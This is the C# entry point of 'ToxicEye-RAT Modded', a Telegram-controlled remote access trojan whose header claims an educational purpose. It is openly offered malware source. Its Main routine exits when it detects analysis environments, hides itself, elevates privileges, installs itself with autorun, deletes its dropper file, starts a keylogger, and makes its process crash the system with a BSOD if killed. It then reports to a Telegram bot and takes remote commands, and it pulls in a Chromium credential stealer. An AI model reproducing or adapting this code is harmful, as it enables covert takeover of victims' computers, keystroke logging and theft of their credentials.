/* 
       ^ Author    : LimerBoy && c0z3dc0
       ^ Name      : ToxicEye-RAT Modded
       ^ Github    : https://github.com/LimerBoy && https://github.com/c0z3dc0

       > This program is distributed for educational purposes only.
*/


using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using TelegramRAT.core.stealer.Chrom;

namespace TelegramRAT
{
    class Program
    {
        
        [STAThreadAttribute]
        static void Main(string[] args)
        {
            if (AntiAnalysis.VirtualBox.Check() == true || AntiAnalysis.SandBox.Check() == true || AntiAnalysis.Debugger.Check() == true || AntiAnalysis.Emulator.Check() == true || AntiAnalysis.Hosting.Check() == true)
            {
                Application.Exit();
            }
            // Hide console
            persistence.HideConsoleWindow();
                // Mutex check
                persistence.CheckMutex();
                // SSL
                System.Net.ServicePointManager.SecurityProtocol = System.Net.SecurityProtocolType.Ssl3 | System.Net.SecurityProtocolType.Tls | System.Net.SecurityProtocolType.Tls11 | System.Net.SecurityProtocolType.Tls12;
                // Get admin rights
                persistence.elevatePrevileges();

                Directory.CreateDirectory(cGetChromium.path);
                // Delay before starting
                persistence.Sleep();
                // Check if on VirtualBox, Sandbox or Debugger
                persistence.runAntiAnalysis();
                // Install to system & hide directory
                persistence.installSelf();
                // Add to startup
                persistence.setAutorun();
                // Delete file after first start
                persistence.MeltFile();
                // Check internet connection
                utils.isConnectedToInternet();
                // Check for blocked process
                persistence.processCheckerThread.Start();
                // Start offline keylogger
                utils.keyloggerThread.Start();
                // Protect process (BSOD)
                persistence.protectProcess();
                persistence.PreventSleep();
                // Send 'online' to telegram bot
                telegram.sendConnection();
                // Wait for new commands
                telegram.waitCommandsThread.Start();
                // Need for system power events
                var shutdownForm = new persistence.MainForm();
                System.Windows.Forms.Application.Run(shutdownForm);

        }
        
    }
}
